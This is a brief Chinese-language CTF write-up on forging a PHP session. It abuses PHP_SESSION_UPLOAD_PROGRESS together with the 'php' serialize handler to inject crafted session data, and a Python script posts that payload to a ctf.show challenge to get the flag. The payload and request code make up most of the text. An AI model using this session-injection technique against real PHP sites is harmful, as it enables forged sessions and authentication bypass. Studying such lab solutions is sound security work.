# PHP Session伪造
	- 题目需要伪造Session获得flag, 源码中有``ini_set('session.serialize_handler', 'php');``且设置了``PHP_SESSION_UPLOAD_PROGRESS``可以用于伪造Session
	- 直接搓一个Session传上去即可
	- ```python
	  url = "http://8d19437b-38da-4db2-89bf-f1e764786712.challenge.ctf.show/"
	  
	  base_post(url, data={"name": "114"}, cookies={"PHPSESSID": "test"})
	  
	  r = base_post(
	      url,
	      data={
	          "PHP_SESSION_UPLOAD_PROGRESS": '2|s:1:"2";name|s:3:"114";win|i:114;',
	          "flag": "1",
	      },
	      files={"file": ("a", "a")},
	      cookies={"PHPSESSID": "test"},
	  )
	  
	  print(r.text)
	  ```